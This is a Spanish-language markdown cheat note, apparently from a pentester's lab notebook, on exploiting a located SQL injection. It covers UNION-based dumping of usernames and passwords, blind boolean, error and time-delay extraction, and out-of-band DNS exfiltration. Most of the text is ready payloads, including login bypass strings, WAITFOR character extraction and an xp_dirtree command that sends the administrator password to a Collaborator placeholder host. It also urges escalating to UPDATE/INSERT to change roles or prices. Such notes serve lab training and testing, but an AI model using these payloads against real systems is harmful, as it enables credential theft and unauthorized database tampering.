# SQL Injection — Punto de entrada

> Documento **agnóstico al negocio**: responde *cómo **explotar** una SQLi ya localizada*.
> **Dónde** buscarla en el target y para qué objetivo → eso vive en los `STAGE_x` (recon del negocio).

## 📚 Referencias rápidas

- 🧪 **Laboratorios** — 18 labs, orden oficial + foco de cada uno: [labs/README.md](labs/README.md)
- 📄 **Cheat sheet** — sintaxis por motor (concat, substring, comentarios, versión, contenidos, errores condicionales, time delays, DNS/OAST…): [cheat-sheet.md](cheat-sheet.md)
- 🕶️ **Ofuscación SQL** (bypass de WAF): [[vulnerabilities/019-obfuscacion/sql-obfuscation|sql-obfuscation]]

## 🗂️ Tipos de SQLi (mapa)

- **Recuperación directa (in-band):** el dato **vuelve en la respuesta**. Ej.: mostrar registros ocultos vía `WHERE` (`' OR 1=1--`) o **login bypass** (`administrator'--`). → metodología abajo.
- **UNION-based:** agregás tu propio `SELECT` para volcar **otras tablas** en la respuesta visible. → sección **UNION attacks**.
- **Blind:** **no ves** el dato; lo inferís por **booleano / error / tiempo / OAST**. → sección **Blind SQLi**.
- **Escritura (menos común):** `UPDATE` / `INSERT` / stacked queries → **modificar** la base, no solo leerla. → callout al final.

## 🧪 Cómo explotar (metodología)

1. **Confirmar la inyección:** romper con `'`; observar error o cambio de comportamiento. Calibrar con `OR 1=1` / `AND 1=2`.
2. **Comentar el resto:** `--`, `-- ` (con espacio), `#` — según el motor.
3. **Identificar el motor** (Oracle / MySQL / MSSQL / PostgreSQL): define sintaxis de comentario, concatenación, `sleep` y vistas de metadatos → ver [cheat-sheet.md](cheat-sheet.md).
4. **UNION (salida visible):** nº de columnas (`ORDER BY n` / `UNION SELECT NULL,NULL…`) → columna que acepta texto → exfiltrar (`information_schema` / `all_tables`).
5. **Si es blind, escalar el oráculo en este orden:** `error-based` → `time-based` → `OAST / Collaborator`.
   - Booleano si la respuesta cambia; error condicional si no; retardo de tiempo si tampoco; out-of-band (DNS/HTTP) como último recurso.
6. **Filtro / WAF:** ofuscar el payload (entidades HTML/numéricas, tab *Hackvertor*) → ver [[vulnerabilities/019-obfuscacion/sql-obfuscation|sql-obfuscation]].

## 🔗 UNION attacks — vectores directos

> Cuando el dato **vuelve en la respuesta**: agregás `UNION SELECT` para traer columnas de otras tablas.
> **Requisitos:** mismo **número de columnas** y **tipos de dato compatibles** entre las dos consultas.
> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos.

**1) Contar columnas** (dos técnicas):

`ORDER BY` — subís el número hasta que da error:
<pre><code>' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--     ← error = te pasaste; la última que funcionó = nº de columnas</code></pre>

`UNION SELECT NULL` — agregás NULL hasta que **deja** de dar error:
<pre><code>' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--</code></pre>

Oracle exige `FROM`:
<pre><code>' UNION SELECT NULL FROM dual--</code></pre>

**2) Encontrar la columna que acepta texto** (para volcar strings) — reemplazás cada NULL por `'a'`; la que **no** da error sirve:
<pre><code>' UNION SELECT '<mark>a</mark>',NULL,NULL,NULL--
' UNION SELECT NULL,'<mark>a</mark>',NULL,NULL--
' UNION SELECT NULL,NULL,'<mark>a</mark>',NULL--
' UNION SELECT NULL,NULL,NULL,'<mark>a</mark>'--</code></pre>

**3) Volcar datos** en la(s) columna(s) útil(es):
<pre><code>' UNION SELECT <mark>username</mark>,<mark>password</mark> FROM <mark>users</mark>--</code></pre>

Varios valores en **una sola** columna (concatenar):
<pre><code>' UNION SELECT <mark>username</mark>||'~'||<mark>password</mark> FROM <mark>users</mark>--</code></pre>

**¿Qué volcar (versión, tablas, columnas)?** ya está en [cheat-sheet.md](cheat-sheet.md) → *Database version* (`@@version`, etc.) y *Database contents* (`information_schema.tables/columns`; Oracle `all_tables` / `all_tab_columns`). No lo repito acá.

## 🕵️ Blind SQLi — vectores directos

> Cuando **no ves** los datos en la respuesta. Escalá el oráculo en orden: **booleano → error → tiempo → OAST**.
> Los ejemplos están en sintaxis **MSSQL** (`WAITFOR`, `xp_dirtree` son de SQL Server); la sintaxis equivalente por motor está en [cheat-sheet.md](cheat-sheet.md).
> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (condición, tabla/columna, subdominio de Collaborator).

**0) Respuesta condicional (booleano)** — la página **cambia** (muestra/oculta algo) según verdadero/falso.

Calibrar:
<pre><code>' AND '1'='1     → verdadero: respuesta normal
' AND '1'='2     → falso: la respuesta cambia</code></pre>

Extraer carácter a carácter (subís la posición y probás cada char):
<pre><code>' AND (SELECT SUBSTRING(<mark>password</mark>,<mark>1</mark>,1) FROM <mark>users</mark> WHERE <mark>username='Administrator'</mark>)='<mark>a</mark>'--</code></pre>

**1) Error condicional (hacer fallar con error no controlado)** — la respuesta no cambia salvo un **error 500** cuando la condición es verdadera. El `1/0` (división por cero) solo se ejecuta si la condición es true → oráculo.
<pre><code>xyz' AND (SELECT CASE WHEN (<mark>Username='Administrator' AND SUBSTRING(Password,1,1)>'m'</mark>) THEN 1/0 ELSE 'a' END FROM Users)='a</code></pre>

**2) Verbose error messages (extraer el dato dentro del texto del error)** — el error de conversión se imprime y **filtra el valor**.
<pre><code>' AND 1=CAST((SELECT <mark>example_column</mark> FROM <mark>example_table</mark>) AS int)--</code></pre>

Ej. la respuesta muestra `invalid input syntax for integer: "secret"` → ahí está el dato. (MySQL usa `EXTRACTVALUE`; ver [cheat-sheet.md](cheat-sheet.md).)

**3) Time delays (a ciegas por tiempo)** — confirmás y extraés **midiendo el retardo**.

Confirmar (comparar los dos):
<pre><code>'; IF (1=2) WAITFOR DELAY '0:0:10'--   → no tarda
'; IF (1=1) WAITFOR DELAY '0:0:10'--   → tarda 10s = inyectable</code></pre>

Extraer (condición sobre el dato → si es true, tarda):
<pre><code>'; IF (SELECT COUNT(*) FROM <mark>users</mark> WHERE <mark>username='Administrator' AND SUBSTRING(password,1,1)>'m'</mark>)=1 WAITFOR DELAY '0:0:10'--</code></pre>

(Otros motores: `pg_sleep(10)`, `SLEEP(10)`, `dbms_pipe.receive_message`; ver [cheat-sheet.md](cheat-sheet.md).)

**4) Out-of-band (OAST / DNS)** — cuando **no hay** respuesta, error ni tiempo. Necesitás **Burp Collaborator**.

Disparar (confirmar la interacción DNS):
<pre><code>'; exec master..xp_dirtree '//<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/a'--</code></pre>

Exfiltrar (el dato viaja en el **subdominio** de la petición DNS):
<pre><code>'; declare @p varchar(1024);set @p=(SELECT <mark>password FROM users WHERE username='Administrator'</mark>);exec('master..xp_dirtree "//'+@p+'.<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/a"')--</code></pre>

(Oracle: `EXTRACTVALUE(xmltype(...))`; PostgreSQL: función + `nslookup`; ver [cheat-sheet.md](cheat-sheet.md).) Automatizá el 0–3 con los [scripts](#-scripts-de-ayuda) de abajo.

> [!warning] No es solo lectura: también es vector de escritura
> Una SQLi **no se limita a leer** con `SELECT`. Es poco probable, pero puede permitir **`UPDATE` / `INSERT` / `DELETE`** — o sea, **modificar** la base, no solo extraerla. Casos típicos:
> - La consulta vulnerable **ya es un `UPDATE`/`INSERT`** (ej. editar perfil, registro, carrito) → tu inyección altera esa escritura.
> - El motor/driver permite **stacked queries** (`; INSERT ...`, `; UPDATE ...`) → encadenás tu propia sentencia (ver *Batched queries* en la [cheat-sheet.md](cheat-sheet.md); ojo: Oracle no las soporta).
>
> **Foco:** ante una SQLi, no descartes escalar de *robar datos* a *cambiar datos* (ej. subir tu rol, `password` de otro usuario, precios). Trátala siempre como vector de ataque completo, no de solo lectura.

## 🐍 Scripts de ayuda

- Blind por errores condicionales → [blind-sql-conditional-errors.py](blind-sql-conditional-errors.py)
- Blind por retardos de tiempo → [blind-sql-using-delay.py](blind-sql-using-delay.py)
- Fuerza bruta de password extraído → [brute-force-password.py](brute-force-password.py)
